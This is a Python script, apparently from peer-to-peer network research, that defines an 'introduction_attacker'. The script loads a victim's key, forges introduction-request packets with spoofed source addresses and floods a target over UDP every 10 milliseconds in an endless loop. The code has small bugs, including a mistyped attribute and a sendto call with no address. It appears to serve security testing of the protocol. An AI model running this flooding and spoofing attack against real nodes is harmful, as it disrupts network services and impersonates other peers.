import os
import sys
import socket
from walker.crypto import ECCrypto,LibNaCLSK
from walker.Message import Message
import walker.util as util
import time

BASE = os.path.dirname(os.path.abspath(__file__))

class introduction_attacker(object):
    def __init__(self,target_address=None):
        self.master_key = "3081a7301006072a8648ce3d020106052b8104002703819200040503dac58c19267f12cb0cf667e480816cd2574acae" \
                     "5293b59d7c3da32e02b4747f7e2e9e9c880d2e5e2ba8b7fcc9892cb39b797ef98483ffd58739ed20990f8e3df7d1ec5" \
                     "a7ad2c0338dc206c4383a943e3e2c682ac4b585880929a947ffd50057b575fc30ec88eada3ce6484e5e4d6fdf41984c" \
                     "d1e51aaacc5f9a51bcc8393aea1f786fc47cbf994cb1339f706df4a"
        self.master_key_hex = self.master_key.decode("HEX")
        self.crypto = ECCrypto()
        self.global_time = 0
        self.encoded_crawl=None


        self.ec = self.crypto.generate_key(u"medium")
        self.key = self.crypto.key_from_public_bin(self.master_key_hex)
        self.master_identity = self.crypto.key_to_hash(self.key.pub())
        self.dispersy_version = "\x00"
        self.community_version = "\x01"
        #abandom name "prefix", use "header" to replace
        self.start_header = self.dispersy_version+self.community_version+self.master_identity
        if not target_address:
            self.target_ip = util.get_private_IP(("8.8.8.8",8))
            self.target_port = 25000
            self.target_address = (str(self.target_ip),self.target_port)
        else:
            self.target_address = target_address
        if os.path.isfile(os.path.join(BASE, 'ec_multichain.pem')):
            print("key already exists, loading")
            with open(os.path.join(BASE, 'ec_multichain.pem'), 'rb') as keyfile:
                binarykey = keyfile.read()
                self.victim_key = LibNaCLSK(binarykey=binarykey)
        else:
            pass

        self.victim_identity = self.crypto.key_to_hash(self.victim_key.pub())
        self.victim_public_key = self.crypto.key_to_bin(self.victim_key.pub())
        
        self.my_key = self.crypto.generate_key(u"medium")
        self.my_identity = self.crypto.key_to_hash(self.my_key.pub())
        self.my_public_key = self.crypto.key_to_bin(self.my_key.pub())
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.private_address = ("192.168.1.2",2000)
        self.public_address = ("35.150.1.1",2000)



    def send_crawl(self):
        if self.encoded_crawl:
            self.socket.sendto(self.encoded_crawl)

        else:
            sequence_number = 0
            message_crawl = Message(neighbor_discovery=self,requested_sequence_number=sequence_number)
            message_crawl.encode_crawl()
            self.encode_crawl = message_crawl.packet
            self.socket.sendto(message_crawl.packet,self.target_address)

    def send_introduction(self):
        message_introduction_request = Message(neighbor_discovery=self,destination_address=self.target_address,
                                               source_private_address =self.private_address,source_public_address=self.public_address)
        #encode the message to a introduction request, the binary string will be stored at attribute packet
        message_introduction_request.encode_introduction_request()
        self.socket.sendto(message_introduction_request.packet,self.target_address)

    def start(self):
        while True:
            self.send_introduction()
            time.sleep(0.01)


if __name__ == "__main__":
    attacker = introduction_attacker()
    attacker.start()


